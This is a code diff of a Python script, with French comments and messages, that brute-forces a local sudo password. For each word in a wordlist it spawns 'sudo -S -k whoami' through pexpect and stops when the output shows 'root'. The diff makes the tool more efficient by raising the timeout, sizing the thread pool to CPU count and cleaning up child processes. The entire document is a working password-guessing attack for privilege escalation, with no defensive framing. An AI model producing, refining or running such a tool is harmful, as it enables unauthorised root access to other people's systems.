@@ -2,45 +2,44 @@ import pexpect
 import argparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
+import multiprocessing
 
-# Fonction pour tester un mot de passe avec pexpect
 def test_password(pw, index):
     print(f"[{index}] Test mot de passe: {pw}")
+    child = None
     try:
-        # Lance un processus sudo avec pexpect
-#        child = pexpect.spawn("sudo -S su -c 'whoami'", encoding="utf-8")
         child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
-        # Envoie le mot de passe
         child.sendline(pw)
-        # Attendre la sortie de la commande
-        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.035)
+        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.1)  # Timeout augmenté
         if child.after == "root":
-            print(f"✅ Mot de passe : {pw} [{index}]")
+            print(f"✅ Mot de passe trouvé : {pw} [{index}]")
             os._exit(0)
-    except:
+    except Exception as e:
+        # Optionnel: décommenter pour debug
+        # print(f"Erreur avec {pw}: {e}")
         return None
+    finally:
+        if child and child.isalive():
+            child.close()
 
-# Fonction principale
 def main():
-    # Argument parser
     parser = argparse.ArgumentParser(description="Bruteforce sudo using a wordlist.")
     parser.add_argument("--wordlist", required=True, help="Chemin vers le fichier wordlist")
     args = parser.parse_args()
 
-    wordlist = args.wordlist
-
-    # Chargement du fichier wordlist
-    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
+    with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
         passwords = [line.strip() for line in f if line.strip()]
 
-    # Utilisation de ThreadPoolExecutor pour exécuter 16 threads en parallèle
-    with ThreadPoolExecutor(max_workers=32) as executor:
-        # Soumission de chaque test de mot de passe au thread pool
+    max_workers = multiprocessing.cpu_count() * 2
+    print(f"Lancement du bruteforce avec {max_workers} threads...")
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = {executor.submit(test_password, pw, i+1): pw for i, pw in enumerate(passwords)}
-
-        # Attendre que les threads se terminent
+        
         for future in as_completed(futures):
             future.result()
+    
+    print("Aucun mot de passe trouvé.")
 
 if __name__ == "__main__":
     main()
